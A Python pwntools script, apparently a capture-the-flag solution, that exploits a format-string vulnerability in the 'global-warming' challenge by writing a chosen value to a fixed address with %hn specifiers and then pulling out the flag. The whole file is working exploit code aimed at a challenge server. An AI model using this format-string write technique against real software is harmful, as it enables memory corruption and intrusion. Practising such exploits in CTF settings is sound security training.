#!/usr/bin/env python

from pwn import *

HOST = 'chall.csivit.com' 
PORT = 30023

context.log_level = 'error'

what = "b4dbabe3"
where = 0x0804c02c

# e = ELF('./global-warming')
# io = e.process()
io = remote(HOST, PORT)

first = str(int(what[4:], 16) - 8).encode()
second = str(int(what[:4], 16) - int(what[4:], 16)).encode()

log.info(f"{first}, {second}")

payl = p32(where) + p32(where+2) + b"%" + first + b"x%12$hn%0" + second + b"x%13$hn"

io.sendline(payl)
print(re.search(b'csictf{.*}', io.recvregex('{.*}'))[0].decode())
